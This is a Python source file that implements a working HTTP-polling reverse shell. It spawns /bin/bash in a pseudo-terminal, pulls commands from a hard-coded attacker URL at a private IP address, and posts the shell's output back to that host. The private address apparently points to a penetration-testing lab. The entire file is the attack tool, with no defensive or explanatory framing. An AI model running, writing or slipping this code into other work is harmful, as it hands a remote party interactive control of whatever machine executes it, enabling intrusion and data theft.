from threading import Thread
import time
import os
import pty
import signal
import termios
import sys

try:
    # For Python 3.0 and later
    from urllib.request import urlopen
except ImportError:
    # Fall back to Python 2's urllib2
    from urllib2 import urlopen

ATTACKER_URL = 'http://192.168.119.198'
COMMAND = ['/bin/bash']


pid, master = pty.fork()
if pid == 0:
    fd = sys.stdin.fileno()
    # setup the new pseudo-tty
    new = termios.tcgetattr(fd)
    new[3] &= ~termios.ECHO # disable echo
    
    termios.tcsetattr(fd, termios.TCSANOW, new)
    os.execlp(COMMAND[0], *COMMAND)

run = True

def get_stdin():
    try:
        while run:
            res = urlopen(ATTACKER_URL + "/stdin")
            input_data = res.read()
            os.write(master, input_data)
            time.sleep(0.5)
    except:
        pass
        
def post_stdout():
    try:
        output_data = os.read(master, 1024)
        while output_data is not None and len(output_data) > 0:
            res = urlopen(ATTACKER_URL + "/stdout", data=output_data)
            output_data = os.read(master, 100)
    except:
        pass

thread_stdin = Thread(target=get_stdin)
thread_stdout = Thread(target=post_stdout)
thread_stdout.daemon = True

thread_stdin.start()
thread_stdout.start()

try:
    os.wait()
except KeyboardInterrupt:
    os.kill(pid, signal.SIGKILL)
    
run = False
thread_stdin.join()
thread_stdout.join()
